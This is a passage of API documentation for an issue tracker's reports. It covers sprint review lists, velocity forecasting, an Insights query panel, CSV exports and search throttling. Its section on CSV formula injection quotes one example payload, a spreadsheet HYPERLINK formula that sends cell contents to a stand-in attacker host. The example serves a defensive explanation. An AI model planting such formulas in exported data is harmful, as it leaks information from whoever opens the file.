**The five lists are labelled views, not a partition.** An issue is in `committed` and — if it landed — in `completed` too; that overlap is the whole point of the retro's headline. Only `committed` + `addedAfterStart` are disjoint and together cover everything the sprint ever held; only `completed` + `carriedOver` partition what it held at its end.

- **`committed`** — what was in the sprint when it started: the commitment batch the start wrote, one `ADDED` per member stamped exactly `startAt`.
- **`addedAfterStart`** — what joined afterwards. The number that makes a missed sprint legible.
- **`removedBeforeEnd`** — what someone pulled *off* the sprint while it was running. **Distinct from `carriedOver`**, which is work the sprint ran out of time for. The two are separated without any timestamp comparison: a completion stamps `completedAt` in the update that arbitrates it and only *then* writes the ledger rows for the issues it moves out, so at that instant those issues are still members.
- **`completed`** — in the sprint at its end and closed by then. **Identical in membership to the last point of the burn-up's completed line**, on purpose: two reports over one ledger that disagreed about what "done in this sprint" means would discredit both.
- **`carriedOver`** — in the sprint at its end and not closed. For a finished sprint that is exactly what the completion moved to the backlog or the next sprint; for a running one it is what is still open right now.

**The headline's denominator is `atEndCount`, not the commitment.** *"Completed 18 of 25"* reads `completedCount` of `atEndCount` — completed plus carried over, i.e. what the sprint **held at its end** — so the numerator is a subset of its own denominator and the ratio cannot exceed one. Against the *commitment* it can: work added after the start can be completed, so counting completions against what was committed compares two different populations, and a sprint that took late work on and finished it reported *"completed 25 of 23"*. The commitment is not lost by that — it keeps its own list, its own count and its own point sum beside the outcome, and `addedAfterStartCount` is precisely the clause that turns *"we missed the plan"* into *"the plan changed"*.

**A `null` point sum means "no estimates here" and is not a zero.** `points` on a list — and `committedPoints` / `atEndPoints` / `completedPoints` on the totals — is `null` when **nothing** in that population carried an estimate, **empty lists included**. A list of six unestimated issues summing to `0` is indistinguishable on the wire from six issues estimated at zero, and a `0` reads as a measurement where a `null` reads as an absence. It is structural rather than something you re-derive: without it every client would have to infer emptiness from `count > unestimatedCount` in each of the five places a list is rendered. `unestimatedCount` is stated **per list** for the same reason — "committed 55 points" means something quite different when six of the twenty-three issues were never estimated.

**A deleted issue still gets a row**, rendered from the ledger's snapshot: `deleted: true`, its `key` and its entry `points`, and `null` for `issueId`, `title`, `typeId`, `assigneeId`, `statusId` and `closedAt` — everything only the live issue could answer. **Render it as the line it is — "DEMO-77 (deleted)" — rather than as a broken link, and never drop it**, because dropping it would silently change what the sprint delivered.

**A deleted issue out of a COMPLETED sprint always lands in `carriedOver`, with a null `closedAt`.** Completion lives on the issue, the issue is gone, and removing an issue from a frozen sprint writes no ledger row — so nothing in the record could prove it was finished. It is neither dropped (which would shrink what the sprint committed to) nor claimed as completed (which a report may not do for something it cannot show). The row's `deleted: true` and null completion are how you can see that the line is a shadow rather than a verdict.

**Rows keep the order they first entered the sprint** — chronological for `addedAfterStart`, deterministic for the rest, and never dependent on a key's lexicographic accident (`DEMO-10` sorts before `DEMO-9`).

**No per-assignee anything.** `assigneeId` is a field on a row so you can show an avatar; nothing in this feature groups, counts, sums or filters by it, and nothing may. And as everywhere on this path, **no capability changes any status code** — this report answers for any sprint that exists, in any project, whatever its `board` or `estimation` setting.

### Velocity — how much should we plan for next sprint

`GET …/reports/velocity` is the planning end of the set: the last N **completed** sprints as bars, each showing what it delivered with its commitment marked on it, and beside them a p50/p85 band to plan the next sprint with. The whole response is one sentence with a picture — *"Recent sprints delivered between 14 and 23 issues; plan for ~18 (p50) and treat 23 (p85) as a stretch. Based on 6 sprints."*

```bash
curl -s "$BASE/workspaces/$WS/projects/$PROJ/reports/velocity?sprints=6" \
  -H "Authorization: Bearer $TOKEN"
```

```json
{
  "measure": "COUNT",
  "sprints": [
    { "sprintId": "0192cc…", "name": "Sprint 6",
      "startAt": "2026-05-01T09:00:00Z", "completedAt": "2026-05-15T16:02:41Z",
      "committed": 19, "completed": 14, "addedAfterStart": 2, "carriedOver": 5,
      "unestimatedCount": 0 },
    { "sprintId": "0192d1…", "name": "Sprint 7",
      "startAt": "2026-05-15T16:10:00Z", "completedAt": "2026-05-29T15:44:09Z",
      "committed": 21, "completed": 18, "addedAfterStart": 4, "carriedOver": 3,
      "unestimatedCount": 2 }
  ],
  "forecast": { "p50": 18.0, "p85": 23.0, "sampleSize": 6 },
  "meta": {
    "computedAt": "2026-08-20T09:14:22Z", "basedOnIssues": 142,
    "truncated": false, "cap": 20000,
    "firstIssueAt": "2024-11-04T08:31:00Z", "unmatchedFilters": []
  }
}
```

**This is the report the [family's three refusals](#how-every-report-behaves) were written for, and it is where they bite hardest.** Velocity's documented harm is not its arithmetic, it is its audience: a single number read as a productivity score, compared between teams, and answered by inflating estimates. So the three are not merely absent here, they are enforced — and an integrator who reads them as gaps will ask for the wrong thing:

- **No per-person breakdown.** Not a filter, not a field, not a tooltip extra, not a future CSV column, and it will not be added. The statement behind this endpoint does not select an actor or an assignee column at all, so the refusal holds a layer below the response shape — there is nothing here to break down *by*.
- **No cross-project or workspace-level aggregate, and the endpoint's own path is the enforcement.** This shape exists only under `/projects/{pId}/`; there is no workspace rollup and there must not be one. Comparing two teams means opening two pages and doing the arithmetic by hand, and **that friction is the design** — the cost of the comparison is paid by the person about to make it, because the harm above comes from comparisons cheap enough to make without thinking about them. An aggregate added "for convenience" deletes the mitigation and keeps the metric.
- **No single quotable average.** There is no `averageVelocity` field and there is not meant to be one. What you get is a range that always arrives with its own sample size, precisely so there is nothing to paste into a status report.

**`sprints` is refused at both ends, never clamped.** It defaults to `6` — roughly a quarter of a year — and anything below `1` or above `12` is a `400` whose `detail` names the bound and the value you asked for:

```json
{ "status": 400,
  "detail": "sprints must be between 1 and 12 (asked for 24). The sample is not clamped for you: a forecast built from a different number of sprints than the one you asked for is worse than no forecast. 12 is about half a year, and a band computed from further back describes a team that has since changed its members, its process and its definition of a point." }
```

The lower bound is not pedantry: `sprints=0` would otherwise fail deeper in as a `500` on an endpoint whose contract promises a `400`, and *"zero sprints"* is a question with no answer rather than a request for an empty chart. And the cap of 12 is deliberately an order of magnitude below Jira's (120 sprints / 25 000 issues, raisable by a REST call) — not only for cost, but because **a band computed from further back is a precise number about a team that no longer exists**: different members, a different process, a different idea of what a point is.

**The two kinds of `400` are ordered differently against tenancy, and you can see the difference.** A value that fails to *bind* — `sprints=x`, an unknown `measure`, a malformed path UUID — is refused by the framework before the handler runs, so it `400`s even for a project you cannot see. A value that binds and is *then* judged — `sprints=99` — is refused only after tenancy is resolved, so on a project you cannot see it is a `404`, because a `400` there would confirm the project exists.

**There is no `sprintId`, and no `404` of its own.** The sample is resolved *from the project* — its most recently completed sprints — so no caller-supplied sprint id ever reaches the query. That is the subject-versus-filter rule from the other side: velocity's subject is the **project**, which the path already names, so there is nothing here that could fail to resolve.

**The four numbers on a bar all share the requested measure.** Under `POINTS` all four are point sums; under `COUNT` all four are issue counts. A tooltip mixing "41 points delivered" with "4 issues added" would carry two units with no way for a reader to tell which is which.

- `committed` — what was in the sprint at `startAt`. Marked **on** the bar rather than drawn as a second bar beside it: it is the plan, and the plan is context for the outcome, not a competing outcome.
- `completed` — what was still in the sprint at `completedAt` and closed by then. **The bar's height, and the only number the band is computed from.**
- `addedAfterStart` — everything that entered after `startAt`. The clause that turns *"we missed the plan"* into *"the plan changed"*: without it, a bar below its own commitment marker reads as a failure whatever actually happened. With `committed` it partitions everything the sprint ever held.
- `carriedOver` — still in the sprint at `completedAt` and not closed. With `completed` it partitions what the sprint **held at its end**, which is the denominator the [sprint review](#sprint-review--committed-added-removed-completed-carried-over)'s headline uses — never `committed`, which counts a different population.

Every boundary here is `completedAt`, never the planned end date, exactly as on the sprint review.

**`unestimatedCount` is per sprint and is reported under both measures, and it is what keeps the chart honest.** It counts how many of the issues the sprint **held at its end** (the `completed` + `carriedOver` population) carried no estimate. Under `POINTS` an unestimated issue contributes `0` to the bar, so a sprint where nine of twenty-three issues were never estimated is a silent zero nine times over — **the bar and the band derived from it are quietly biased low**, with nothing else in the response to notice. Under `COUNT` it is the same disclosure a reader needs before flipping the toggle. Surface it.

**Points are the ledger's entry snapshot, not current estimates** — the sprint review's rule, and the opposite of the burn-up's. See [the table under "How every report behaves"](#how-every-report-behaves) for all three in one place. The short version: velocity is retrospective and every sprint it describes is frozen, so with current points a re-estimate today would move a bar drawn four months ago *and the band computed from it*, and tomorrow's plan would change because somebody tidied yesterday's backlog. It also keeps the bar and its drill-down consistent — `committed` here is summed from the same snapshots the sprint review sums, so the review is literally the bar's breakdown.

**The band is a p50/p85 with a sample size, and it is suppressed for two different reasons — which are not the same news.** `forecast` is **always present**; when it is suppressed both percentiles are `null` while `sampleSize` still states what there was, so a client says what it has rather than showing an empty box. Read `forecast.p50 === null` — suppression is a fact about the data, not a change of response shape. **The bars still render either way**: they are facts, and only the band is an inference.

- **Fewer than three completed sprints** — *"Not enough completed sprints to forecast (need 3, have 2)"*. Three is the smallest sample in which a p50 and a p85 can name different sprints at all; at two, the "band" would be the range itself dressed up as a statistic. Same principle as `/cycle-time`'s percentile suppression, one level up — and **time fixes it**.
- **`meta.truncated` is true** — the row cap bit, so the bars that survived are no longer the sample anybody asked for, and a p85 over a subset the reader did not choose is a number this report may not stand behind. **Time does not fix this one**; it is a bound being hit. See the truncation note below.

**Read `meta.truncated` to tell the two apart.** A client that treats null percentiles as only ever meaning "not enough history yet" will explain the second case to its user wrongly.

A project that has **never completed a sprint** is a `200` with an empty `sprints` list and `sampleSize: 0` — never a `404`, and never an error.

**The band is fractional even under `COUNT`.** Percentiles use PostgreSQL's `percentile_cont` definition — the same one `/cycle-time` uses, so a "p85" means one thing across this product — which interpolates between the two sprints straddling the rank. So a six-sprint sample can legitimately answer `p50: 18.5` while every bar is a whole number. Percentiles are also never a rolling average and never a mean: one washed-out sprint would drag a mean somewhere no sprint ever was, and a forecast naming an outcome the team has never had is the "these numbers don't match what I expected" failure the `meta` block exists to prevent.

**`sprints[]` is chronological, oldest first**, so you render left to right in time without sorting, and every bar carries `startAt` and `completedAt` so order never has to be inferred from a name.

**When `meta.truncated` is true, `sprints[]` can be substantially shorter than the count you asked for — read it as "bars are missing", not as a quiet quarter.** Once the row cap has bitten, **every** sampled sprint with no shipped ledger rows is dropped, not merely one that was cut in half.

The reason whole sprints go rather than a shaved tail is worth knowing, because it is also why the band is withheld. The sweep reads the ledgers ordered by sprint id, and those ids are **UUID v7 — time-ordered** — so a cap that bites removes the later-created sampled sprints' rows *entirely*. An absent sprint is then indistinguishable from the perfectly legitimate "nobody ever put anything in this sprint", and read as that it would be drawn as a bar of four zeros — **and those zeros would enter the forecast as real samples**, dragging p50 and p85 toward zero. A truncated report would quietly understate the team's output with `meta.truncated` as the only hint, while still drawing a band somebody would go on to quote. So the conservative reading wins: a sprint that really was empty vanishes from a truncated report, which is much the cheaper error.

The bars that do ship are each complete, so they render; `forecast` is suppressed; `meta.truncated` says the cap bit; and `meta.basedOnIssues` — counted in the database above the cap — still states how many issues the report was about, so you can see how much is missing. Twelve sprints of hundreds of events against a cap of 20 000 makes this unreachable on real data; it is handled anyway, because "unreachable" is a property of today's data.

`meta.basedOnIssues` here is the distinct issues the sampled sprints' ledgers hold, **counted in the database above the cap** and counted **once** for an issue that appeared in two of the sampled sprints. `meta.firstIssueAt` is the family's — the project's earliest issue, never the sample's — because scoping it to the sampled sprints would report a five-year-old project as having six sprints of history and fire a thin-data warning on exactly the projects with the most of it.

**No capability changes any status code.** A `KANBAN` project answers with whatever sprints it has completed, and `measure=POINTS` answers with points in a project whose `estimation` is `false`.

### Insights — break down the query in the search box

`POST …/search/insights` is the dashboard replacement, and the seventh and last report of the set. Instead of a grid of independently-configured widgets, **one panel whose dataset is the HQL query already in the search box**: `slice` picks the x axis, `segment` optionally colours it, and the answer describes the same population the result list underneath is showing.

That one-dataset design is the whole argument for it. There is nothing to double-count across widgets, no layout to migrate, and a [saved filter](#saved-filters) becomes a saved report at no cost — the panel cannot disagree with the list beneath it, because both compile from one query through one predicate.

**It is the odd one out in this family in three ways, each deliberate**: it is a `POST`, it is **workspace-scoped** (so it lives on the search base path, not under `/projects/{pId}/reports`), and **its refusals are `422`, not `400`**. Each is explained below, because each is a place a client generalising from the other six will get it wrong.

```bash
curl -s -X POST "$BASE/workspaces/$WS/search/insights" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"query":"status IN (\"In Progress\",\"In Review\")","slice":"ASSIGNEE","segment":"PRIORITY","measure":"COUNT"}'
```

```json
{
  "measure": "COUNT",
  "slice": "ASSIGNEE",
  "segment": "PRIORITY",
  "slices": [
    { "bucket": { "id": "0192c4…", "label": "Dana Reyes", "hql": "assignee = \"dana@acme.io\"" },
      "count": 14, "points": 31, "unestimatedCount": 3 },
    { "bucket": { "id": null, "label": null, "hql": "assignee IS EMPTY" },
      "count": 6, "points": 8, "unestimatedCount": 4 }
  ],
  "segments": [
    { "id": "0192b8…", "label": "High", "hql": "priority = \"High\"" },
    { "id": "0192b9…", "label": "Medium", "hql": "priority = \"Medium\"" }
  ],
  "cells": [
    { "sliceId": "0192c4…", "segmentId": "0192b8…", "count": 9, "points": 21, "unestimatedCount": 1 },
    { "sliceId": "0192c4…", "segmentId": "0192b9…", "count": 5, "points": 10, "unestimatedCount": 2 },
    { "sliceId": null, "segmentId": "0192b9…", "count": 6, "points": 8, "unestimatedCount": 4 }
  ],
  "sliceMultiValued": false,
  "segmentMultiValued": false,
  "slicesTruncated": false,
  "cellsTruncated": false,
  "sliceCap": 200,
  "cellCap": 1000,
  "meta": {
    "computedAt": "2026-08-20T09:14:22Z", "basedOnIssues": 20,
    "truncated": false, "cap": 20000,
    "firstIssueAt": null, "unmatchedFilters": []
  }
}
```

**Every field of the body is optional**, so `{}` is a valid request meaning *"count everything I can see, grouped by status"*. `query` is the **same HQL string [`POST …/search`](#search-hql) takes** — parsed, validated, resolved and compiled by the same machinery, which is what guarantees the panel and the list cannot disagree — and empty means every issue you can see, exactly as on search. `measure` defaults to `COUNT`, `slice` to `STATUS`, and a blank `segment` means unsegmented. All three tokens are case-insensitive.

**It is a `POST`, and that changes what caching means — do not expect the browser to help.** The query is a body (up to 2 000 characters), not a query string. **A `POST` response is not served from an HTTP cache**: browsers do not cache them, and RFC 9111's narrow allowance requires a `Content-Location` header no client here sends. So the `Cache-Control: private, max-age=60` and `Vary: Authorization` this endpoint carries are for **consistency and defence**, not for effect — they match the rest of the reports surface, and they mean that if an intermediary ever cached this anyway the response is already marked private and keyed on the credential. **The real 60-second de-duplication is client-side**, in your own query cache, which is where it has to be for a `POST`.

**It spends two throttle budgets, not one, and the lower configured value binds** — past either, the answer is `429` with a `Retry-After` header (seconds), a retryable throttle rather than a fault. The panel sits under `…/search/**`, so it draws on the [search budget](#search-hql), and because it is a report it is *also* bound explicitly to the [reports budget](#how-every-report-behaves). Both are spent per request. It sits on the reports limiter deliberately, because removing that binding would raise the panel’s allowance to the search budget as a side effect — so do not assume which of the two governs: that follows from whatever an operator has configured, and lowering *either* property lowers the panel. **A panel refresh therefore competes with report fetches *and* with searches** — size your retries against the lower of the two.

**Its refusals are `422` naming the parameter, not `400`.** This diverges from the five `/reports` endpoints on purpose. There, `?measure=BOGUS` is a *binding* failure Spring raises before the handler runs, so it is a `400` whose detail is generic. Here the parameters arrive inside a JSON body and are resolved in the service, so an unknown `measure`, `slice` or `segment` is a **`422` that names the parameter and lists what it accepts** — which is also what every other refusal under `/search` looks like. A client that generalises the reports family's `400` will handle the wrong code. Four things are `422`:

- an **unparseable query** — `errorType: "PARSE_ERROR"` with a highlight span (`position`, `length`, nullable `token`);
- a **semantic query error** — `errorType: "SEMANTIC_ERROR"` with the offending `field` and `position`. Byte-for-byte what `POST …/search` returns for the same query, because it is the same pipeline;
- an **unknown `measure` / `slice` / `segment`**;
- **`segment` equal to `slice`** — a diagonal is not a breakdown, and it is refused rather than rendered, because the response would look like a broken chart with nothing in it to explain why.

The only `400`s are binding-level: a malformed body, a `query` over 2 000 characters, a `measure` / `slice` / `segment` over **32** characters, or a path id that is not a UUID. Note where the line falls on those three tokens: an **oversized** one is rejected at binding, before it is ever looked at, so it is a `400` — while an **unrecognised** one reaches the resolver and is the `422` above. A missing workspace and a non-member are the same `404`, never a `403`.

**`measure` ranks; it does not filter.** Every bucket always carries `count`, `points` **and** `unestimatedCount`, whatever you asked for — they fall out of one `GROUP BY` and cost nothing measurable, so flipping your own toggle needs no round trip. What the measure decides is the `ORDER BY`, and therefore **which buckets survive the caps**: a response is the top `sliceCap` buckets *by that measure*, so **`POINTS` can return a different set of bars than `COUNT` over the identical query**. That is correct rather than surprising — "the ten statuses with the most issues" and "the ten with the most points" are different questions, and a truncated top-N has to know which one it was asked. `NONE` means "no y axis, draw a table"; server-side it ranks by count (a bucket must be ordered by *something* to be capped at all) and it is echoed back so you know not to draw bars.

**A bar's height is not the sum of its stacks, and you must not compute it that way.** Bars and cells are capped **separately** — `sliceCap` (200) and `cellCap` (1000), both fixed constants rather than operator settings — and the bars get their own `GROUP BY`. So **`slices[].count` and `points` are always exact**, even when the breakdown under them is partial. Summing the cells to get a bar would make every truncated response quietly understate its own chart.

**Two truncation flags, two different pictures, and a client should be able to say which happened.**

- `slicesTruncated` — **bars are missing from the x axis**. There were more buckets than `sliceCap`, and what you got is the largest by `measure`.
- `cellsTruncated` — **the breakdown inside the bars is partial**. Either there were more cells than `cellCap`, or a cell belonged to a bar that did not survive `sliceCap` (a stack belonging to no bar is unrenderable, so it is dropped and this flag is set). The bars themselves are still exact.

Note what does **not** happen: `meta.truncated` stays `false` and `meta.cap` keeps meaning `app.reports.max-rows`. That is a fact rather than a stub — this report materialises **no issue rows at all** (PostgreSQL aggregates and returns buckets), so the row cap cannot bite, the same thing [`/flow`](#flow--created-vs-resolved) reports for the same reason. What can truncate here is buckets, and that is what the two flags above are for.

**`meta.basedOnIssues` is deliberately not the sum of the series.** It is the distinct issues matching your query — **the same number the search result list shows** — computed independently of every cap. With a many-valued dimension the bars sum to **more** than it (one issue with three labels lands in three buckets); when a cap bites they sum to **less**. Neither is a defect, and `sliceMultiValued` / `segmentMultiValued` are on the response precisely so you can label the total honestly rather than leaving the reader to discover the mismatch. Today `LABEL` is the only many-valued dimension.

**Buckets are keyed by id, not by name, and you will see the consequence.** Each visible project owns its own statuses, types, priorities, components and sprints, so two projects can both have an "In Progress": two catalog rows, **two buckets, one label**, and the panel shows both. Grouping by name was rejected because it fails more quietly — a name that no longer resolves would produce a bar whose own filter fragment `422`s the moment somebody clicked it. `cells` reference buckets **by id**, and `null` is a **real id** (the no-value bucket), so match it as one rather than treating it as missing.

**`bucket.label` is `null` for the no-value bucket** — unassigned, no component, no labels, not in a sprint. "Unassigned" / "No component" / "Backlog" is UI copy, and the server deliberately does not send it; supply your own.

**`bucket.hql` is the click-through fragment, and where it is `null` the bar is not safely clickable.** It selects **exactly** the issues in that bucket, for the click-to-narrow affordance — the panel is a navigation device as much as a chart. **Do not rebuild it client-side.** It looks trivial and it is not: the rule behind every `null` is *the fragment reproduces this bucket exactly, or there is no fragment*, and a locally-built clause breaks that silently by producing valid-looking HQL over the wrong set. It is `null` in four cases:

- the dimension has **no HQL vocabulary at all** — `PROJECT`, see below;
- the bucket's name **does not resolve**: a **completed sprint**, an **archived** component or label. HQL drops those from name resolution on purpose, so a fragment naming one would `422` the moment it was clicked;
- the name resolves to **more than one id** — the cross-project "In Progress" above. The fragment would be strictly **wider than the bar**, and a filter returning more issues than the bar you clicked is exactly the "these numbers don't match" failure this epic is organised around;
- on `ASSIGNEE` only, when the member has no email. The fragment addresses people by email because that is unique within a workspace; a display name is not, and would silently widen to every match.

**`PROJECT` is a slice with no click-through.** Issues carry a project and your search scope already restricts which are visible, so the grouping is perfectly good — but HQL has no `project` field yet, so **every project bucket ships `hql: null`**. The slice works; the drill-down does not. That is a known gap with its own ticket, not a bug.

**`ASSIGNEE` is offered here and refused by [velocity](#velocity--how-much-should-we-plan-for-next-sprint), and that is not an inconsistency.** Velocity is a *published metric* — stable URL, quoted in a ceremony — where a per-person column becomes a comparison whether anyone meant it or not. This is an *ad-hoc query somebody typed*: its dataset is whatever HQL is in the box, it is not addressable as "the team's number", and the same person could get the same breakdown by running eight searches and writing the totals down. The line is **published metric vs. ad-hoc query**.

**Capability narrows what is offered, never what resolves.** [`GET /search/schema`](#search-hql) carries an `insights` block listing the measures and dimensions worth putting in front of this caller: `SPRINT` appears only when at least one visible project has `board: SCRUM`, and `POINTS` only when at least one has `estimation` on — mirroring how the `sprint` and `storyPoints` *fields* are narrowed. **A dimension omitted there still resolves if you ask for it**, exactly as an omitted field still parses. No status code depends on a capability, so a saved panel state cannot break because a curator flipped a project toggle.

### CSV exports — the chart as a file

Every one of the six project reports has a `.csv` sibling: append `.csv` to the path. It takes **the same parameters** as its JSON twin, answers **the same status codes**, and returns `200 text/csv; charset=UTF-8` with `Content-Disposition: attachment`.

| Method | Path | Auth | Rows |
|---|---|---|---|
| `GET` | `…/reports/flow.csv?from=&to=&interval=&typeId=&componentId=&labelId=` | member | One per bucket |
| `GET` | `…/reports/cycle-time.csv?from=&to=&typeId=&componentId=&labelId=` | member | One per plotted point (= one per completed issue) |
| `GET` | `…/reports/aging.csv` | member | One per open issue, carrying its column |
| `GET` | `…/reports/sprint-burnup.csv?sprintId=&measure=` | member | One per UTC day |
| `GET` | `…/reports/sprint-review.csv?sprintId=` | member | One per issue **per list** |
| `GET` | `…/reports/velocity.csv?sprints=&measure=` | member | One per completed sprint |

**What you get is the plotted series — one row per data point — not a list of issues.** That is the whole feature. Where an export like this exists at all it usually hands back a flat issue list, which is the documented disappointment: people ask for the chart, get a spreadsheet of issues, and go back to screenshotting. Every row in these files is a point that was drawn, and every point that was drawn is a row.

`cycle-time.csv` and `aging.csv` look like the exception and are not: their charts are scatter plots **of issues**, so one dot is one issue, and `key` and `title` are there to identify the dot you are pointing at. Neither carries a description, a status history or a component list — the columns an issue export would have and a chart does not plot.

**There is no "matching issues" export in this API, and you should not read these files as one.** The "download matching issues" button is a different feature, and the search-side export path it needs **does not exist yet** — there is no CSV or export endpoint under `/search`, and it cannot be assembled client-side either: HQL has no `project` field to scope the handoff with, and no `resolved`/`closed` field, so the flow report's *resolved* half is not expressible as a query at all. It is filed as its own ticket. Until it lands, a report CSV is the numbers that were drawn and nothing else.

#### The comment header is part of the contract

Above the rows sits a `#`-comment block. It is what makes an exported file still say what it is after it has been mailed on, renamed and opened three weeks later — treat it as contract, not decoration. **Every line in the file is CSV cells — the header lines and the column row included** — so one reader parses the whole thing.

```
<BOM>"# Hamstrack report: velocity"
"# Project: DEMO - Demo Project"
"# Project id: 0192a0…"
"# Measure: COUNT"
"# Window: 6 completed sprints"
"# Forecast: p50=18, p85=23, sample size=6 - a range to plan the next sprint with, and deliberately not a single number to compare teams by"
"# Computed at: 2026-08-20T09:14:22Z"
"# Based on issues: 142"
"# Truncated: no (row cap 20000)"
"sprintId","name","startAt","completedAt","committed","completed","addedAfterStart","carriedOver","unestimatedCount"
0192cc…,"Sprint 6",2026-05-01T09:00Z,2026-05-15T16:02:41Z,19,14,2,5,0
```

It carries the report name, the project key + name + id, the window, the measure / sprint / interval **where the report has one**, the percentiles **or the reason they were suppressed**, `computedAt`, `basedOnIssues`, and whether truncation bit.

**A parser must not require a fixed header block.** Only the lines that apply are emitted — **most reports have no measure at all** (only the burn-up and velocity take one), `aging` states that it *has* no window rather than printing an empty one, and the suppression, truncation, unmatched-filter and no-sprint lines appear only when they are true. Match on the `# key: value` shape, never on position or count — and **unquote the line first: each header line is one quoted CSV cell**, `#` included.

That quoting is a security control rather than tidiness. A comment line emitted raw is still split on commas, so only its *first* cell begins with `#`: a project or sprint name containing a comma ends that cell and opens a new one, which is free to begin with `=`. Neither name restricts commas or equals signs, so wrapping the whole line in quotes is what closes the breakout. The column row is quoted for the same reason.

**If you already parse these files, this is the one behaviour change to know about.** Because `#` now sits *inside* the quotes, a reader configured to drop comment lines by a leading `#` — `pandas.read_csv(..., comment="#")` and its equivalents — **no longer skips the header**, and sees one-column rows instead. The trade was taken deliberately: there is no format in which a line both starts with a bare `#` and is a single cell. Either match the header and read it (which is what the rest of this section tells you to do anyway), or drop lines whose first cell starts with `#` *after* unquoting — but do not filter on a bare leading `#`.

Every honesty rule the JSON carries travels with the numbers, because an export is a new surface rather than a serialisation format: a suppressed percentile pair or velocity band is suppressed here too **with the reason in the header** rather than left as an empty column to be read as zero; `cycleDays` is empty where no start was recorded and is never backfilled from `created_at`; a truncated series says so instead of silently shipping fewer rows; a filter that matched nothing is named, so a thin file is never mistaken for a quiet quarter.

#### Six things you cannot guess from the JSON

1. **Not every report has a measure**, and the header emits only the lines that apply — hence the rule above about not requiring a fixed block.
2. **`sprint-review.csv` is not a plotted series at all**, because the report is not a chart. It is five labelled lists, so the file is one row per issue **per list**, with a leading `list` column. **The same key legitimately appears more than once** — an issue that was committed and then completed is in both lists — exactly as on screen. Summing a column across the whole file double-counts.
3. **The burn-up's scope-change log is deliberately not folded in.** Two tables in one CSV is a file no spreadsheet opens correctly. The header counts the changes and points at the JSON endpoint, so you are told what is missing rather than left to notice.
4. **A missing subject is a `200`, not an error.** "No ACTIVE sprint" is a `200` in JSON, so the file is a `200` whose header carries a `# No sprint:` note and which has zero data rows. An unexplained empty CSV would recreate exactly the ambiguity the JSON avoids.
5. **`null` is an empty, unquoted field** — never `""`, never `null`. Report gaps are real (a cycle time with no start, a suppressed band, a sprint with no completion date), and an empty field is what every spreadsheet and dataframe library reads back as *missing*.
6. **UTF-8 BOM, CRLF line endings.** Both are deliberate. Without the BOM, Excel on Windows decodes the file as the system code page and mangles every non-ASCII title; the cost is three bytes a strict RFC 4180 parser will see on the first line, and Excel, LibreOffice, Sheets, `pandas` (`encoding="utf-8-sig"`) and R all strip it.

#### Formula injection: text cells are guarded, numbers are not

Text cells are **always quoted** (inner quotes doubled), and a text cell whose first character is `=`, `+`, `-`, `@`, tab or CR is **prefixed with an apostrophe**. Without that, an issue titled `=HYPERLINK("https://evil/"&A1,"Q3 plan")` becomes a live exfiltration link the moment a colleague opens the file, and quoting does not help — the CSV parser strips quotes before the formula engine sees the value. **Expect that leading apostrophe when parsing text columns**, and strip it if you are re-importing.

**Numeric, date, enum, UUID and boolean cells are deliberately not guarded.** A negative `net` or a negative scope `delta` legitimately begins with `-`, and prefixing it would turn the column into text that will not sum — which is the "these numbers don't match" failure this whole area is built to avoid. Those cells are server-generated from typed values and cannot carry attacker input.

**The comment header is quoted for the same reason, and that is a recent fix.** A header line emitted raw is still split on commas, so only its first cell begins with `#`; a project or sprint name containing a comma ends that cell and opens a new one that is free to begin with `=`. Neither name restricts commas or equals signs, so the whole line — `#` included — is now one quoted cell, as is the column row. See the parser note above for what that changes for `comment="#"` readers.

#### Filenames, caching and content negotiation

The filename is **built by the server**, never taken from the client: `<PROJECT KEY>-<report>-<YYYY-MM-DD>.csv`, e.g. `DEMO-velocity-2026-08-20.csv`. Its date is the same `computedAt` the header prints, so the name and the contents can never disagree — which is how two exports of the same report are told apart in a downloads folder.

Caching is the family's (`private, max-age=60` + `Vary: Authorization`): a download is still a live read over one tenant's data. The throttle is the family's too — these six sit under `…/reports/**`, so they spend the same [reports budget](#how-every-report-behaves) as their JSON twins, and a `429` is possible on any of them.

One thing is specific to the exports: they declare `produces: text/csv`, so **an `Accept` header that excludes `text/csv` is a `406`** rather than a CSV body labelled as JSON. Error responses are unaffected — a `400`, `404` or `429` on a `.csv` path still comes back as `application/problem+json`.

## Search (HQL)

Search issues across a whole workspace with **HQL** (Hamstrack Query Language) — a small, readable query language. Results are cross-project but always restricted to the caller's **visible (non-archived) projects**; this scope is enforced server-side and no query text can widen it. All three endpoints require workspace membership (`404` for a non-member).

**All three are throttled**, and until recently none of them was. They share a **per-principal budget of 120 requests per minute** across the whole `…/search/**` path **and the whole `…/filters/**` path**; past it the answer is `429` with a `Retry-After` header (seconds). The same budget also covers **every [saved-filter](#saved-filters) operation** under `…/filters/**` — `GET` and `DELETE` included, since the binding is by path and not by method — because **HQL validation is search-surface work wherever it is mounted**: validating a filter builds the same resolution context `GET …/search/schema` pays for (roughly eight statements, including a workspace-wide label projection and a full member scan), so `POST …/filters` with a deliberately invalid body was an unthrottled eight-query refusal loop. It is charged here rather than to the reports pot because a saved filter *is* a saved search: the same person doing the same work. It is a retryable throttle, not a fault — nothing was computed, and the identical request succeeds after the wait. The budget is **separate from the [reports](#reports) budget** on purpose, because a person typing in a search box legitimately fires several requests a minute. It is spent **before** the workspace is resolved, so an over-budget caller is refused even for a workspace they cannot see, and the `429` looks identical for a real workspace and a nonexistent one. Note that these are the *expensive* endpoints rather than the cheap ones: a query may carry dozens of text predicates that compile to unanchored, unindexable scans over a text column, and the whole predicate runs **twice** per request (count, then page). The [Insights panel](#insights--break-down-the-query-in-the-search-box) sits on this path too and spends this budget **as well as** the reports one. The counters live **in memory on each app node**, so a deployment running several instances gives each caller that budget *per instance* rather than one budget overall — it damps an abuse vector rather than enforcing an invariant, so a split budget is a weaker guard and never a wrong answer. Do not quote it as a global quota.

| Method | Path | Auth | Description |
|---|---|---|---|
| `POST` | `/workspaces/{wsId}/search` | member | Run an HQL query. Paginated ([envelope](#conventions), `size` clamped `1`–`100`) |
| `GET` | `/workspaces/{wsId}/search/schema` | member | Autocomplete metadata: fields, per-field operators, and value picklists. **Suggestion-only, and [capability-aware](#search-hql)** — a field it omits still resolves |
| `GET` | `/workspaces/{wsId}/search/suggest?field=&q=` | member | Typeahead for user-valued fields (`assignee`/`reporter` or a USER custom field) and for `label` / `component` / `fixVersion` / `affectsVersion`, capped at 20 |

**Query** — the body is `{"query", "page?", "size?"}`. `query` is the HQL string (max 2000 chars — a longer one is rejected at binding with `400`); an empty or omitted `query` matches all visible issues in the default sort.

```bash
curl -X POST $BASE/workspaces/$WS/search \
